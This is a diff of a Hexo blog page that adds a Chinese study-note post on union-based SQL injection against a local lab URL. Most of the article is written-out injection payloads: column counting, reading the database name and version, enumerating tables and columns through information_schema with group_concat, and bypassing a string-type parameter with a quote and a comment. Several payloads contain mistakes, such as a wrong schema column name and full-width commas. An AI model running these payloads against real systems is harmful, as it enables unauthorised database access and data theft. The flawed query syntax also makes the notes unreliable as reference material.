@@ -15,7 +15,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>aaa |  Ymnnb</title>
+      <title> Ymnnb</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/1.ico" />
@@ -57,27 +57,47 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="page-"
-  class="article article-type-page"
+  id="post-sql注入草稿"
+  class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  aaa
-</h1>
- 
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/sql%E6%B3%A8%E5%85%A5%E8%8D%89%E7%A8%BF/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.182Z" itemprop="datePublished">2024-07-29</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">703</span>
+        </span>
+    </span>
 
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">3 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
       
-    </header>
-       
+
+
+
+  
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <p>127.0.0.1&#x2F;sqli&#x2F;union.php?id &#x3D; 0 union select 1,2,3,4<br>select 1,2,3,4<br>select 1,2,3,4表示占位符<br>就比如前面id &#x3D; 0没有查到数据的时候，就会填补到查询结果中<br>例如：?id &#x3D; 1 union select 1,2,3,4可以查到数据<br>得到： Name：lihua  Year：2002<br>?id &#x3D; 0 union select 1,2,3,4 不能查到数据<br>那么就得到：  Name：2  Year：3<br>后面的1,2,3,4给顶上去<br>这里1,2,3,4代表有多少个字段<br>Name：2  Year：3<br>代表Name是第二个字段，Year是第三个字段<br>如果改为 ?id &#x3D; 0 union select 1,database(),3,4<br>可得到：  Name：player  Year：3<br>player是表名<br>为什么1,4没有显示呢？<br>在平时的查询中，通常不会将所有的数据展示出来<br>而只是展示部分字段<br>可得到：  Name：test  Year：3<br>database()得到test是数据库名<br>如何得到表名<br>我们需要查询版本号<br>version()<br> ?id &#x3D; 0 union select 1,version(),3,4<br>版本为5.0以上，存在information_schema表<br>这个表可以查询到表名<br> ?id &#x3D; 0 union select 1,22,table_name,4 from information_schema.tables where information_schema&#x3D;database()<br>如果我们表不止一个<br>我们可以通过<br>limit n,m &#x3D;&#x3D;&#x3D;&gt; 从N+1开始取数据，取m行<br> ?id &#x3D; 0 union select 1,22,table_name,4 from information_schema.tables where information_schema&#x3D;database() limit 0,1<br>从第一行开始查一行<br> ?id &#x3D; 0 union select 1,22,table_name,4 from information_schema.tables where information_schema&#x3D;database() limit 1，1<br>从第二行开始去一行<br>若没有，则说明只有一行数据<br>即只有一个表<br>或者通过函数<br>group_concat()<br>concat<br>select concat(1,2,3)<br>结果为123，分别把123拼接了起来<br> ?id &#x3D; 0 union select 1,22,group_concat(table_name),4 from information_schema.tables where information_schema&#x3D;database() limit 1，1<br>这样可以查出所以表名<br>查出表名，就要查字段名<br> ?id &#x3D; 0 union select 1,22,group_concat(columns_name),4 from information_schema.columns where information_schema&#x3D;database() and table_name &#x3D; ‘player’<br>有了表名，字段名<br>就可以组成一个完整的字段名<br>select 11，id,name,44 from player limit 0,1<br>就可以组成一个完整的查询<br>字符型：127.0.0.1&#x2F;sqli&#x2F;union.php?id &#x3D; 1 ‘ and 1&#x3D;1 – qwe<br>后端的sql语句：select name,year from xxx where id &#x3D; ‘ &amp;id<br>id<br>id<br>id 被读取为 1 ‘ and 1&#x3D;1 – qwe<br>组成语句：select name,year from xxx where id &#x3D; ‘ 1 ‘ and 1&#x3D;1 – qwe ‘<br>这样的话，如果变量为字符型，就能被我们注入<br>为什么有一个– ，– 在sql中代表注释的意思<br>– 后面的语句不会被sql识别，这样就能去掉它本身的’<br>让语句成为我们自己拼凑的语句<br>为什么是– qwe（即在– 后面在上一串字母）<br>为什么如果不加上，url被读取的时候会自动消去掉后面的空格<br>也就达不到我们想要的效果</p>
+ 
       <!-- reward -->
       
     </div>
@@ -141,7 +161,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/aaa/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/07/29/sql%E6%B3%A8%E5%85%A5%E8%8D%89%E7%A8%BF/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -150,9 +170,37 @@
   </div>
 
    
+  <nav class="article-nav">
+    
+      <a href="/2024/07/29/vlan/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            (no title)
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/07/29/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E8%8D%89%E7%A8%BF%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title"></div>
+      </a>
+    
+  </nav>
+
   
    
   
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
 </article>
 
 </section>
@@ -283,6 +331,22 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
 
 <script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
 <link
